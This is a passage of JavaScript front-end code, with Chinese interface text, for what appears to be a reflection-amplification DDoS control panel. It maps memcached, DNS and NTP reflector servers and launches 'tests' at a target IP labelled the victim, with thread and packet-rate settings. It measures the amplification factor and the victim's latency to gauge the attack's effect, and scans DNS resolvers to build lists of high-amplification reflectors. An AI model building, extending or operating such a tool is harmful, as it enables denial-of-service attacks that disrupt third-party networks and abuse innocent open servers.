    if (!svg || !container || !window.d3 || !serverMapShapes) return;
    const normalizedFeatures = features.map(normalizeFeatureForGlobe);
    const width = Math.max(280, container.clientWidth);
    const height = Math.max(300, container.clientHeight);
    const selection = d3.select(svg);
    selection.attr("viewBox", `0 0 ${width} ${height}`).selectAll("*").remove();

    const projection = d3.geoNaturalEarth1().fitSize([width, height], serverMapShapes.countries);
    const path = d3.geoPath(projection);
    const zoomLayer = selection.append("g").attr("class", "map-zoom-layer");
    const initialTransform = serverMap2dZoomTransform || d3.zoomIdentity;

    zoomLayer.append("g")
        .selectAll("path")
        .data(serverMapShapes.countries.features || [])
        .join("path")
        .attr("class", "map-base")
        .attr("d", path);

    zoomLayer.append("g")
        .selectAll("path")
        .data(normalizedFeatures)
        .join("path")
        .attr("class", (feature) => `map-area${isAreaSelected(feature.properties?._resourceArea) ? " selected" : ""}`)
        .attr("d", path)
        .attr("fill", (feature) => getAreaFillColor(feature.properties?._resourceArea))
        .on("click", (_, feature) => {
            const area = feature?.properties?._resourceArea;
            if (area?.area_code) selectServerArea(area.area_code);
        })
        .append("title")
        .text((feature) => getAreaTooltipText(feature.properties?._resourceArea));

    zoomLayer.attr("transform", initialTransform);
    const zoom = d3.zoom()
        .scaleExtent([1, 9])
        .extent([[0, 0], [width, height]])
        .translateExtent([[-width * 0.5, -height * 0.5], [width * 1.5, height * 1.5]])
        .on("zoom", (event) => {
            serverMap2dZoomTransform = event.transform;
            zoomLayer.attr("transform", serverMap2dZoomTransform);
        });
    selection.call(zoom).call(zoom.transform, initialTransform).on("dblclick.zoom", null);
}

function buildAreaFeatures() {
    if (!serverMapShapes || !lastGeoAreas.length) return [];
    return lastGeoAreas
        .map((area) => {
            const feature = findAreaFeature(area);
            if (!feature) return null;
            return {
                ...feature,
                properties: {
                    ...(feature.properties || {}),
                    _resourceArea: area
                }
            };
        })
        .filter(Boolean);
}

function normalizeFeatureForGlobe(feature) {
    const clone = {
        ...feature,
        properties: { ...(feature.properties || {}) },
        geometry: {
            ...(feature.geometry || {}),
            coordinates: JSON.parse(JSON.stringify(feature.geometry?.coordinates || []))
        }
    };
    if (clone.geometry.type === "Polygon") {
        clone.geometry.coordinates = normalizePolygonRingsForGlobe(clone.geometry.coordinates);
    }
    if (clone.geometry.type === "MultiPolygon") {
        clone.geometry.coordinates = clone.geometry.coordinates.map(normalizePolygonRingsForGlobe);
    }
    return clone;
}

function normalizePolygonRingsForGlobe(rings) {
    return rings.map((ring, index) => {
        const shouldBeClockwise = index === 0;
        const isClockwise = getRingSignedArea(ring) < 0;
        return shouldBeClockwise === isClockwise ? ring : [...ring].reverse();
    });
}

function getRingSignedArea(ring) {
    let area = 0;
    for (let index = 0; index < ring.length; index += 1) {
        const current = ring[index];
        const next = ring[(index + 1) % ring.length];
        area += Number(current?.[0] || 0) * Number(next?.[1] || 0)
            - Number(next?.[0] || 0) * Number(current?.[1] || 0);
    }
    return area / 2;
}

function findAreaFeature(area) {
    if (area.level === "region") {
        if (area.country_code === "CN") return findChinaRegionFeature(area);
        const areaCode = String(area.area_code || "").toUpperCase();
        const regionCode = String(area.region_code || "").toUpperCase();
        return (serverMapShapes.admin1.features || []).find((feature) => {
            const props = feature.properties || {};
            return String(props.iso_3166_2 || "").toUpperCase() === areaCode
                || (String(props.iso_a2 || "").toUpperCase() === area.country_code && String(props.postal || "").toUpperCase() === regionCode);
        }) || findCountryFeature(area.country_code);
    }
    return findCountryFeature(area.country_code);
}

function findChinaRegionFeature(area) {
    const regionCode = String(area.region_code || "").toUpperCase();
    const adcode = CHINA_REGION_ADCODE[regionCode];
    const regionName = String(area.region || "").toLowerCase();
    return (serverMapShapes.china.features || []).find((feature) => {
        const props = feature.properties || {};
        return (adcode && String(props.adcode) === adcode)
            || (regionName && String(props.name || "").toLowerCase().includes(regionName));
    }) || findCountryFeature("CN");
}

function findCountryFeature(countryCode) {
    const code = String(countryCode || "").toUpperCase();
    return (serverMapShapes.countries.features || []).find((feature) => {
        const props = feature.properties || {};
        return String(props.ISO_A2 || props.iso_a2 || "").toUpperCase() === code;
    });
}

function getAreaFillColor(area) {
    const count = Number(area?.resource_count || 0);
    const max = Math.max(1, ...lastGeoAreas.map((item) => Number(item.resource_count || 0)));
    const ratio = Math.log1p(count) / Math.log1p(max);
    const base = {
        tcp: [92, 200, 255],
        memcached: [157, 92, 255],
        dns: [64, 231, 255],
        ntp: [92, 255, 177]
    }[area?.protocol || currentProto] || [64, 231, 255];
    const selected = isAreaSelected(area);
    const alpha = selected ? 0.88 : 0.28 + ratio * 0.5;
    return `rgba(${base[0]}, ${base[1]}, ${base[2]}, ${alpha.toFixed(2)})`;
}

function isAreaSelected(area) {
    return Boolean(area && selectedAreaCode && String(area.area_code || "") === String(selectedAreaCode));
}

function renderAreaTooltip(area) {
    return `<div class="globe-tooltip">${escapeHtml(getAreaTooltipText(area)).replace(/\n/g, "<br>")}</div>`;
}

function getAreaTooltipText(area) {
    if (!area) return "未知区域";
    const name = area.level === "region"
        ? `${area.country || "-"} / ${area.region || area.name || "-"}`
        : `${area.country || area.name || "-"}`;
    const samples = (area.ips || []).slice(0, 5).join(", ");
    const suffix = (area.ips || []).length > 5 ? `，另有 ${(area.ips || []).length - 5} 个 IP` : "";
    return [
        name,
        `协议：${getMethodText(area.protocol)}`,
        `资源数：${area.resource_count || 0}`,
        samples ? `IP：${samples}${suffix}` : ""
    ].filter(Boolean).join("\n");
}

function formatGeoReason(reason) {
    return {
        empty: "空条目",
        dns_failed: "域名解析失败",
        invalid_ip: "无效 IP",
        private_or_reserved: "非公网地址",
        geo_not_found: "无定位结果",
        geo_api_failed: "定位服务失败"
    }[reason] || reason || "未知原因";
}

function addChartData(pps) {
    if (!ppsChart) return;
    ppsDataPoints.push(pps);
    if (ppsDataPoints.length > MAX_PPS_POINTS) ppsDataPoints.shift();
    ppsChart.data.labels = ppsDataPoints.map((_, index) => index + 1);
    ppsChart.data.datasets[0].data = [...ppsDataPoints];
    ppsChart.update("none");
}

function resetChart() {
    ppsDataPoints = [];
    if (!ppsChart) return;
    ppsChart.data.labels = [];
    ppsChart.data.datasets[0].data = [];
    ppsChart.update();
}

function initProtocolCheckboxes() {
    document.querySelectorAll("#multiProtocolSection input[type='checkbox']").forEach((checkbox) => {
        checkbox.addEventListener("change", updateProtocolSelection);
    });
    updateProtocolSelection();
}

function toggleMultiProtocol() {
    const toggle = document.getElementById("multi_protocol");
    const singleGroup = document.getElementById("singleMethodGroup");
    const multiSection = document.getElementById("multiProtocolSection");
    isMultiProtocol = Boolean(toggle?.checked);
    if (singleGroup) singleGroup.style.display = isMultiProtocol ? "none" : "block";
    if (multiSection) multiSection.style.display = isMultiProtocol ? "block" : "none";
    updateProtocolSelection();
    updateWorkflowIndicators();
}

function updateMethodSettings() {
    const method = document.getElementById("method")?.value;
    if (method) loadReflectorCount([method]);
    updateWorkflowIndicators();
}

function updateProtocolSelection() {
    selectedProtocols = Array.from(document.querySelectorAll("#multiProtocolSection input[type='checkbox']:checked"))
        .map((input) => input.value);
    if (isMultiProtocol) {
        loadReflectorCount(selectedProtocols);
    } else {
        const method = document.getElementById("method")?.value;
        loadReflectorCount(method ? [method] : ["memcached", "dns", "ntp"]);
    }
    updateWorkflowIndicators();
}

async function loadReflectorCount(protocols) {
    const countEl = document.getElementById("reflectors_count");
    if (!countEl || !protocols.length) {
        if (countEl) countEl.innerText = "0";
        return;
    }
    try {
        const data = await postJson("/api/servers/count", { protocols });
        if (data.success) {
            countEl.innerText = String(data.total_count || 0);
        }
    } catch (error) {
        countEl.innerText = "0";
    } finally {
        updateWorkflowIndicators();
    }
}

function loadAllServerCounts() {
    loadReflectorCount(["memcached", "dns", "ntp"]);
}

function refreshServerResources() {
    resetServerSelectionState();
    delete availableServerSourcesByProto[currentProto];
    loadServerGeoMap();
    updateWorkflowIndicators();
}

async function startTest() {
    const targetIpInput = document.getElementById("target_ip");
    const targetIp = targetIpInput?.value.trim() || "";
    if (!targetIp) {
        showNotification("请输入目标 IP", "error");
        return;
    }
    if (!validateIpAddress(targetIpInput)) {
        showNotification("IP 格式无效", "error");
        return;
    }

    const data = {
        target_ip: targetIp,
        target_port: readNumber("target_port", 80),
        duration: readNumber("duration", 5),
        threads: readNumber("threads", 8),
        target_pps: readNumber("target_pps", 5000),
        multi_protocol: isMultiProtocol
    };

    if (isMultiProtocol) {
        updateProtocolSelection();
        if (!selectedProtocols.length) {
            showNotification("请至少选择一个协议", "error");
            return;
        }
        data.selected_protocols = selectedProtocols;
        data.method = selectedProtocols[0];
    } else {
        const method = document.getElementById("method")?.value;
        if (!method) {
            showNotification("请选择测试协议", "error");
            return;
        }
        data.method = method;
        data.selected_protocols = [method];
    }

    syncLatencyTarget(data.target_ip, data.target_port);
    resetLatencyBaseline();
    attackStartTimeForLatency = Date.now() / 1000;
    if (!isMonitoringLatency) startLatencyMonitoring();

    setRunningControls(true);
    resetChart();

    try {
        const result = await postJson("/api/test/start", data);
        if (!result.success) throw new Error(result.message || "启动失败");
        showNotification("测试已启动", "success");
        setStatusTag("running", "运行中");
        updateWorkflowIndicators();
    } catch (error) {
        showNotification(`启动失败：${error.message}`, "error");
        setRunningControls(false);
        updateWorkflowIndicators();
    }
}

async function stopTest() {
    try {
        const result = await postJson("/api/test/stop", {});
        showNotification(result.message || "正在停止测试", result.success ? "info" : "error");
    } catch (error) {
        showNotification(`停止失败：${error.message}`, "error");
    } finally {
        setRunningControls(false);
        setStatusTag("stopping", "停止中");
        updateWorkflowIndicators();
    }
}

async function resetTest() {
    try {
        await postJson("/api/test/reset", {});
        showNotification("系统已重置", "info");
    } catch (error) {
        showNotification(`重置失败：${error.message}`, "error");
    }
    setRunningControls(false);
    setStatusTag("idle", "待命中");
    resetChart();
    stopLatencyMonitoring(false);
    resetLatencyBaseline();
    latencyDataPoints = [];
    if (latencyChart) {
        latencyChart.data.labels = [];
        latencyChart.data.datasets[0].data = [];
        latencyChart.update();
    }
    setText("victimInfo", "未指定");
    setText("modeInfo", "单协议");
    setText("methodInfo", "-");
    setText("sendPps", "0");
    setText("bandwidth", "0");
    setText("amplification", "0");
    setText("efficiency", "0");
    setText("progressDetail", "0%");
    const progressBar = document.getElementById("progressBar");
    if (progressBar) progressBar.style.width = "0%";
    const protocolStats = document.getElementById("protocolStatsSection");
    if (protocolStats) protocolStats.style.display = "none";
    latestStatusSnapshot = null;
    updateWorkflowIndicators();
}

function pollStatus() {
    if (pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(async () => {
        try {
            const response = await fetch("/api/config");
            const status = await response.json();
            updateStatusDisplay(status);
        } catch (error) {
            console.warn("状态轮询失败", error);
        }
    }, 1000);
}

function updateStatusDisplay(status) {
    if (!status) return;
    latestStatusSnapshot = status;
    if (status.status === "running") {
        setStatusTag("running", "运行中");
        setRunningControls(true);
    } else if (status.status === "stopping") {
        setStatusTag("stopping", "停止中");
        setRunningControls(true, true);
    } else if (status.status === "error") {
        setStatusTag("stopping", "异常");
        setRunningControls(false);
    } else {
        setStatusTag("idle", "待命中");
        setRunningControls(false);
    }

    const pps = Math.round(status.current_pps || 0);
    const mbps = Number(status.current_mbps || 0);
    const victimMbps = Number(status.victim_mbps || 0);
    const amplification = victimMbps > 0 || mbps > 0 ? victimMbps / Math.max(mbps, 1) : 0;
    const expected = Number(status.expected_amplification || 10);
    const efficiency = expected > 0 ? Math.min(999, (amplification / expected) * 100) : 0;
    const progress = Math.max(0, Math.min(100, Number(status.progress_percent || 0)));

    setText("sendPps", pps.toLocaleString());
    setText("bandwidth", mbps.toFixed(1));
    setText("amplification", amplification.toFixed(1));
    setText("efficiency", efficiency.toFixed(0));
    setText("progressDetail", `${Math.round(progress)}%`);

    const progressBar = document.getElementById("progressBar");
    if (progressBar) progressBar.style.width = `${progress}%`;

    if (status.config) {
        setText("victimInfo", `${status.config.target_ip}:${status.config.target_port}`);
        setText("modeInfo", status.config.method === "multi" ? "多协议" : "单协议");
        if (status.config.method === "multi" && status.config.multi_protocols) {
            setText("methodInfo", status.config.multi_protocols.map(getMethodText).join(" + "));
        } else if (status.config.single_method) {
            setText("methodInfo", getMethodText(status.config.single_method));
        } else {
            setText("methodInfo", "-");
        }
    }

    if (pps > 0) addChartData(pps);
    renderProtocolStats(status);
    updateWorkflowIndicators();
}

function renderProtocolStats(status) {
    const section = document.getElementById("protocolStatsSection");
    const grid = document.getElementById("protocolStatsGrid");
    if (!section || !grid) return;

    const protocols = status.config?.method === "multi" ? (status.config.multi_protocols || []) : [];
    if (!protocols.length) {
        section.style.display = "none";
        grid.innerHTML = "";
        return;
    }

    const protoDetails = status.protocol_details || {};
    section.style.display = "block";
    grid.innerHTML = "";
    protocols.forEach((proto) => {
        const stats = protoDetails[proto] || {};
        const card = document.createElement("div");
        card.className = "protocol-stat-card";
        const iconClass = proto === "memcached" ? "fa-database" : proto === "dns" ? "fa-globe" : "fa-clock";
        card.innerHTML = `
            <div class="protocol-stat-header">
                <div class="protocol-icon" style="background:${getProtocolColor(proto)}"><i class="fas ${iconClass}"></i></div>
                <span class="protocol-stat-name">${getMethodText(proto)}</span>
            </div>
            <div class="protocol-stat-values">
                <div>速率：${Math.round(stats.current_pps || 0).toLocaleString()} pps</div>
                <div>带宽：${Number(stats.current_mbps || 0).toFixed(1)} Mbps</div>
                <div>包数：${Number(stats.packets_sent || 0).toLocaleString()}</div>
            </div>
        `;
        grid.appendChild(card);
    });
}

async function updateSystemInfo() {
    try {
        const response = await fetch("/api/system/info");
        const data = await response.json();
        if (!data.success) return;
        setText("cpuUsage", `${Math.round(data.cpu_percent || 0)}%`);
        setText("memUsage", `${Math.round(data.memory?.percent || 0)}%`);
    } catch (error) {
        console.warn("系统信息更新失败", error);
    }
}

async function updateDetailedSystemInfo() {
    try {
        const response = await fetch("/api/system/info");
        const data = await response.json();
        if (!data.success) return;
        setText("cpuDetail", `${Number(data.cpu_percent || 0).toFixed(1)}%`);
        setText("memDetail", `${Number(data.memory?.percent || 0).toFixed(1)}%`);
        setText("memUsedDetail", `${(Number(data.memory?.used || 0) / 1024 / 1024).toFixed(0)}`);
        setText("memTotalDetail", `${(Number(data.memory?.total || 0) / 1024 / 1024).toFixed(0)}`);
        setText("netSent", `${(Number(data.network?.bytes_sent || 0) / 1024 / 1024).toFixed(1)}`);
        setText("netRecv", `${(Number(data.network?.bytes_recv || 0) / 1024 / 1024).toFixed(1)}`);
    } catch (error) {
        console.warn("系统资源更新失败", error);
    }
}

async function measureLatency() {
    const target = document.getElementById("latencyTargetIp")?.value.trim()
        || document.getElementById("target_ip")?.value.trim();
    const port = readNumber("latencyPort", 80);
    if (!target) return null;
    try {
        const data = await postJson("/api/tcping", { target, port, timeout: 3 });
        return data.success ? data.latency : null;
    } catch (error) {
        return null;
    }
}

async function startLatencyMonitoring() {
    if (latencyMonitorInterval) clearInterval(latencyMonitorInterval);
    isMonitoringLatency = true;
    isLatencySamplePending = false;
    if (!attackStartTimeForLatency) attackStartTimeForLatency = Date.now() / 1000;
    latencyDataPoints = [];
    if (latencyChart) {
        latencyChart.data.labels = [];
        latencyChart.data.datasets[0].data = [];
        latencyChart.update();
    }
    showNotification("延迟监控已启动", "info");

    sampleLatencyOnce();
    latencyMonitorInterval = setInterval(sampleLatencyOnce, 1000);
    updateWorkflowIndicators();
}

function stopLatencyMonitoring(showMessage = true) {
    isMonitoringLatency = false;
    if (latencyMonitorInterval) {
        clearInterval(latencyMonitorInterval);
        latencyMonitorInterval = null;
    }
    isLatencySamplePending = false;
    if (showMessage) showNotification("延迟监控已停止", "info");
    updateWorkflowIndicators();
}

function resetLatencyBaseline() {
    baselineLatency = null;
    baselineSamples = [];
    setText("autoPingBefore", "-- ms");
    setText("latestLatency", "-- ms");
    setText("latencyTrend", "--");
    updateWorkflowIndicators();
}

function syncLatencyTarget(ip, port) {
    const latencyTarget = document.getElementById("latencyTargetIp");
    const latencyPort = document.getElementById("latencyPort");
    if (latencyTarget) latencyTarget.value = ip;
    if (latencyPort) latencyPort.value = port;
}

function updateLatencyDisplay(latency, isTimeout = false) {
    const latest = document.getElementById("latestLatency");
    const trend = document.getElementById("latencyTrend");
    if (!latest || !trend) return;

    if (isTimeout) {
        latest.innerText = "超时";
        latest.style.color = "#ff4f6d";
        trend.innerText = "连接超时";
        trend.style.color = "#ff4f6d";
        updateWorkflowIndicators();
        return;
    }

    latest.innerText = `${latency} ms`;
    latest.style.color = "#5cffb1";
    if (baselineLatency === null) {
        trend.innerText = "--";
        trend.style.color = "#ffbd5c";
        return;
    }
    const diff = latency - baselineLatency;
    trend.innerText = `${diff >= 0 ? "+" : "-"}${Math.abs(diff).toFixed(2)} ms`;
    trend.style.color = diff > 0 ? "#ffbd5c" : "#5cffb1";
    updateWorkflowIndicators();
}

async function sampleLatencyOnce() {
    if (!isMonitoringLatency || isLatencySamplePending) return;
    isLatencySamplePending = true;
    try {
        const latency = await measureLatency();
        if (latency === null) {
            updateLatencyDisplay(null, true);
            addLatencyDataPoint(null);
            return;
        }
        updateLatencyDisplay(latency, false);
        addLatencyDataPoint(latency);
        if (baselineLatency === null && baselineSamples.length < 3) {
            baselineSamples.push(latency);
            if (baselineSamples.length === 3) {
                baselineLatency = baselineSamples.reduce((sum, item) => sum + item, 0) / 3;
                setText("autoPingBefore", `${baselineLatency.toFixed(2)} ms`);
                updateWorkflowIndicators();
            }
        }
    } finally {
        isLatencySamplePending = false;
    }
}

function addLatencyDataPoint(latency) {
    if (!latencyChart) return;
    const elapsed = attackStartTimeForLatency
        ? Math.max(0, Math.round(Date.now() / 1000 - attackStartTimeForLatency))
        : latencyDataPoints.length + 1;
    latencyDataPoints.push({ label: String(elapsed), value: latency });
    if (latencyDataPoints.length > MAX_LATENCY_POINTS) latencyDataPoints.shift();
    latencyChart.data.labels = latencyDataPoints.map((point) => point.label);
    latencyChart.data.datasets[0].data = latencyDataPoints.map((point) => point.value);
    latencyChart.update("none");
}

function validateIpAddress(input) {
    if (!input) return false;
    const pattern = /^(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/;
    const isValid = pattern.test(input.value.trim());
    input.style.borderColor = isValid ? "#40e7ff" : "#ff4f6d";
    return isValid;
}

async function postJson(url, payload) {
    const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });
    const data = await readJsonResponse(response);
    if (!response.ok) {
        throw new Error(data?.message || data?.error || `HTTP ${response.status}`);
    }
    return data ?? {};
}

async function readJsonResponse(response) {
    const contentType = response.headers.get("Content-Type") || "";
    if (!contentType.includes("application/json")) return null;
    try {
        return await response.json();
    } catch (error) {
        return null;
    }
}

function readNumber(id, fallback) {
    const value = Number(document.getElementById(id)?.value);
    return Number.isFinite(value) && value > 0 ? value : fallback;
}

function setText(id, value) {
    const el = document.getElementById(id);
    if (el) el.innerText = value;
}

function escapeHtml(value) {
    return String(value ?? "")
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function setRunningControls(isRunning, isStopping = false) {
    const startBtn = document.getElementById("startBtn");
    const stopBtn = document.getElementById("stopBtn");
    if (startBtn) startBtn.disabled = isRunning;
    if (stopBtn) stopBtn.disabled = !isRunning || isStopping;
}

function setStatusTag(state, text) {
    const tag = document.getElementById("attackModeTag");
    if (!tag) return;
    tag.classList.remove("running", "stopping");
    if (state === "running") tag.classList.add("running");
    if (state === "stopping") tag.classList.add("stopping");
    tag.innerText = text;
}

function getMethodText(method) {
    return {
        tcp: "TCP",
        memcached: "Memcached",
        dns: "DNS",
        ntp: "NTP"
    }[method] || method || "-";
}

function getProtocolColor(protocol) {
    return {
        tcp: "linear-gradient(135deg, #5cc8ff 0%, #267dff 100%)",
        memcached: "linear-gradient(135deg, #7c8cff 0%, #9d5cff 100%)",
        dns: "linear-gradient(135deg, #40e7ff 0%, #2d8cff 100%)",
        ntp: "linear-gradient(135deg, #5cffb1 0%, #1fbf75 100%)"
    }[protocol] || "linear-gradient(135deg, #40e7ff 0%, #2d8cff 100%)";
}

function showNotification(message, type = "info") {
    const notif = document.createElement("div");
    notif.className = `notification ${type}`;
    notif.innerHTML = `<span>${message}</span><button type="button" aria-label="关闭通知">×</button>`;
    notif.querySelector("button")?.addEventListener("click", () => notif.remove());
    document.body.appendChild(notif);
    setTimeout(() => notif.remove(), 3200);
}

function initParticles() {
    const canvas = document.getElementById("particleCanvas");
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    let width = 0;
    let height = 0;
    let particles = [];
    const count = 90;

    function resize() {
        width = window.innerWidth;
        height = window.innerHeight;
        canvas.width = width;
        canvas.height = height;
        particles = Array.from({ length: count }, () => ({
            x: Math.random() * width,
            y: Math.random() * height,
            vx: (Math.random() - 0.5) * 0.24,
            vy: (Math.random() - 0.5) * 0.24,
            r: Math.random() * 1.6 + 0.6,
            a: Math.random() * 0.35 + 0.12
        }));
        resizeCharts();
    }

    function draw() {
        ctx.clearRect(0, 0, width, height);
        particles.forEach((p) => {
            p.x += p.vx;
            p.y += p.vy;
            if (p.x < 0) p.x = width;
            if (p.x > width) p.x = 0;
            if (p.y < 0) p.y = height;
            if (p.y > height) p.y = 0;
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(64, 231, 255, ${p.a})`;
            ctx.fill();
        });
        requestAnimationFrame(draw);
    }

    window.addEventListener("resize", resize);
    resize();
    draw();
}

// ══════════════ DNS 资源扫描 ══════════════

let dnsScanPollInterval = null;
let currentDnsRunId = null;
let currentDnsRuns = [];
let currentDnsSummary = null;
const DNS_DOMAIN_PRESET = [
    "ripe.net",
    "isc.org",
    "dns-oarc.net",
    "iana.org"
];

function bindDnsScanControls() {
    document.getElementById("dnsStartBtn")?.addEventListener("click", startDnsScan);
    document.getElementById("dnsStopBtn")?.addEventListener("click", stopDnsScan);
    document.getElementById("dnsRefreshBtn")?.addEventListener("click", refreshDnsScan);
    document.getElementById("dnsClearRunsBtn")?.addEventListener("click", clearDnsRunRecords);
    document.getElementById("dnsDomainPresetBtn")?.addEventListener("click", fillDnsDomainPreset);
}

function fillDnsDomainPreset() {
    const textarea = document.getElementById("dnsTestDomains");
    if (!textarea) return;
    textarea.value = DNS_DOMAIN_PRESET.join("\n");
}

function updateDnsIpFileSummary(resources = []) {
    const summary = document.getElementById("dnsIpFileSummary");
    if (!summary) return;
    if (!Array.isArray(resources) || !resources.length) {
        summary.textContent = "未发现可用 IP 资源，请检查 attack_resources/shared/ip_lists 目录。";
        return;
    }
    const first = resources[0];
    summary.textContent = `已加载 ${resources.length} 个 IP 资源文件，默认优先展示共享目录中的 txt 文件；当前首项为 ${first.name}，共 ${first.entry_count || 0} 条。`;
}

async function loadDnsIpFiles() {
    try {
        const resp = await fetch("/api/dns-scan/resources");
        const data = await resp.json();
        if (!data.success) {
            updateDnsIpFileSummary([]);
            return;
        }
        const select = document.getElementById("dnsIpFile");
        if (!select) return;
        const resources = Array.isArray(data.resources) ? data.resources : [];
        if (!resources.length) {
            select.innerHTML = `<option value="">暂无可用 IP 资源</option>`;
            updateDnsIpFileSummary([]);
            return;
        }
        select.innerHTML = resources.map((f) => {
            const location = (f.path || "").includes("attack_resources\\shared\\ip_lists")
                ? "共享目录"
                : "DNS 目录";
            return `<option value="${escapeHtml(f.path)}">${escapeHtml(f.name)} · ${f.entry_count} 条 · ${location}</option>`;
        }).join("");
        updateDnsIpFileSummary(resources);
    } catch (e) { /* ignore */ }
}

async function startDnsScan() {
    const startBtn = document.getElementById("dnsStartBtn");
    if (startBtn) startBtn.disabled = true;
    try {
        const domains = document.getElementById("dnsTestDomains")?.value || "";
        const body = {
            ip_file: document.getElementById("dnsIpFile")?.value || "",
            test_domains: domains,
            query_type: document.getElementById("dnsQueryType")?.value || "TXT",
            use_dnssec: document.getElementById("dnsUseDnssec")?.value === "1",
            concurrency: Number(document.getElementById("dnsConcurrency")?.value) || 80,
            timeout_sec: parseFloat(document.getElementById("dnsTimeout")?.value) || 3.0,
            min_amplification: parseFloat(document.getElementById("dnsMinAmplification")?.value) || 3.0,
            min_reliability: parseFloat(document.getElementById("dnsMinReliability")?.value) || 50,
        };
        const resp = await fetch("/api/dns-scan/runs", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body),
        });
        const data = await resp.json();
        if (!data.success) throw new Error(data.message || "启动失败");
        currentDnsRunId = data.run_id;
        showNotification(`DNS 扫描已启动: ${data.run_id}`, "success");
        startDnsPolling();
        await refreshDnsScan();
    } catch (e) {
        showNotification(`DNS 扫描启动失败: ${e.message}`, "error");
    } finally {
        if (startBtn) startBtn.disabled = false;
    }
}

async function stopDnsScan() {
    if (!currentDnsRunId) return;
    try {
        const resp = await fetch(`/api/dns-scan/runs/${currentDnsRunId}/stop`, { method: "POST" });
        const data = await resp.json();
        if (data.success) showNotification("正在停止 DNS 扫描 …", "info");
    } catch (e) {
        showNotification(`停止失败: ${e.message}`, "error");
    }
}

async function clearDnsRunRecords() {
    try {
        const resp = await fetch("/api/dns-scan/runs", { method: "DELETE" });
        const data = await resp.json();
        showNotification(data.message || "记录已清除", "success");
        await refreshDnsScan();
    } catch (e) {
        showNotification(`清除失败: ${e.message}`, "error");
    }
}

function startDnsPolling() {
    if (dnsScanPollInterval) clearInterval(dnsScanPollInterval);
    dnsScanPollInterval = setInterval(refreshDnsScan, 1500);
}

async function refreshDnsScan() {
    if (currentAttackResourceProto !== "dns") return;
    try {
        const resp = await fetch("/api/dns-scan/runs");
        const data = await resp.json();
        if (!data.success) return;
        currentDnsRuns = data.runs || [];
        renderDnsRunList(currentDnsRuns, data.active_run_ids || []);
        const activeIds = data.active_run_ids || [];
        let preferred = currentDnsRunId ? currentDnsRuns.find(r => r.run_id === currentDnsRunId) : null;
        if (!preferred) preferred = activeIds.length ? currentDnsRuns.find(r => r.run_id === activeIds[0]) : null;
        if (!preferred) preferred = currentDnsRuns[0];
        if (!preferred) {
            renderDnsEmptyState();
            updateWorkflowIndicators();
            return;
        }
        currentDnsRunId = preferred.run_id;
        await loadDnsRunDetail(preferred.run_id);
        if (!activeIds.length && dnsScanPollInterval) {
            clearInterval(dnsScanPollInterval);
            dnsScanPollInterval = null;
        }
        updateWorkflowIndicators();
    } catch (e) { /* ignore */ }
}

function renderDnsRunList(runs, activeIds) {
    const container = document.getElementById("dnsRunList");
    if (!container) return;
    if (!runs.length) {
        container.innerHTML = `<div class="info-text">暂无 DNS 扫描任务。</div>`;
        return;
    }
    container.innerHTML = runs.map((r) => {
        const active = r.run_id === currentDnsRunId;
        const running = activeIds.includes(r.run_id);
        return `<button type="button" class="tcp-run-item ${active ? "active" : ""}" data-run-id="${escapeHtml(r.run_id)}">
            <span class="tcp-run-item-main">
                <span>${escapeHtml(r.run_id)}</span>
                <span>优质: ${r.qualified_count || 0} IPs</span>
            </span>
            <span class="tcp-run-item-meta">
                <span>${running ? "执行中" : (r.summary?.timestamp ? "已完成" : "-")}</span>
            </span>
        </button>`;
    }).join("");
    container.querySelectorAll("[data-run-id]").forEach((el) => {
        el.addEventListener("click", async () => {
            currentDnsRunId = el.getAttribute("data-run-id");
            renderDnsRunList(currentDnsRuns, activeIds);
            await loadDnsRunDetail(currentDnsRunId);
        });
    });
}

function renderDnsEmptyState() {
    setText("dnsStatus", "空闲");
    setText("dnsRunId", "-");
    setText("dnsStage", "-");
    setText("dnsProgress", "0/0");
    document.getElementById("dnsStageList").innerHTML = [
        "加载候选 IP 列表", "多域名放大率测量", "按放大率+可靠性筛选", "保存优质 IP 列表"
    ].map((s) => `<div class="tcp-stage-item"><span>${s}</span><strong>待开始</strong></div>`).join("");
    setText("dnsPipelineLog", "尚未选择 DNS 资源获取任务。");
    document.getElementById("dnsRuntimeError").textContent = "";
    document.getElementById("dnsArtifacts").innerHTML = "";
    document.getElementById("dnsQualifiedPreview").textContent = "";
    const meta = document.getElementById("dnsRunMeta");
    if (meta) meta.innerHTML = "";
}

function getDnsStageStatusText(stage, isRunning) {
    if (stage === "done") return "已完成";
    if (stage === "error") return "失败";
    if (stage === "saving") return isRunning ? "保存中" : "已保存";
    if (stage === "filtering") return isRunning ? "筛选中" : "已筛选";
    if (stage === "scanning") return isRunning ? "测量中" : "已测量";
    if (stage === "loading") return isRunning ? "加载中" : "已加载";
    return isRunning ? "运行中" : "空闲";
}

function renderDnsQualifiedPreview(qualifiedIps = []) {
    const container = document.getElementById("dnsQualifiedPreview");
    if (!container) return;
    if (!qualifiedIps.length) {
        container.textContent = "暂无优质 IP。完整结果可通过输出文件查看。";
        return;
    }
    const preview = qualifiedIps.slice(0, 5).map((ip) => escapeHtml(ip)).join("、");
    container.innerHTML = `<strong>已筛出 ${qualifiedIps.length} 个优质 IP</strong><br>预览：${preview}${qualifiedIps.length > 5 ? " 等" : ""}<br>完整列表请直接打开 <code>qualified_ips.txt</code>。`;
}

function renderDnsMeta(detail) {
    const container = document.getElementById("dnsRunMeta");
    if (!container) return;
    const stats = detail?.stats || {};
    const config = detail?.config || {};
    const items = [
        ["当前阶段", getDnsStageStatusText(stats.stage || "", Boolean(detail?.is_running))],
        ["查询类型", config.query_type || "-"],
        ["DNSSEC", config.use_dnssec === true ? "开启" : (config.use_dnssec === false ? "关闭" : "-")],
        ["并发数", config.concurrency ?? "-"],
        ["最小放大率", config.min_amplification ?? "-"],
        ["最小可靠性", config.min_reliability ?? "-"],
        ["优质 IP", stats.qualified ?? detail?.qualified_count ?? "-"],
        ["失败原因", detail?.runtime_error || "-"]
    ];
